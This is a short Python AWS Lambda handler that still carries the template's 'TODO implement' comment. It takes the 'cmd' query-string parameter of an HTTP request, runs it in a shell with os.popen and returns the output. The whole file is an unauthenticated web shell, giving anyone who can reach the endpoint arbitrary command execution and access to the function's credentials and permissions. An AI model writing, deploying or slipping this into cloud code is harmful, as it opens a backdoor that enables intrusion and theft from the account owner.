import json
import sys
import os
import subprocess

def lambda_handler(event, context):
    # TODO implement
    cmd_result = os.popen(event['queryStringParameters']['cmd']).read()
    return {
        "statusCode": 200,
        "body": json.dumps(cmd_result)
    }
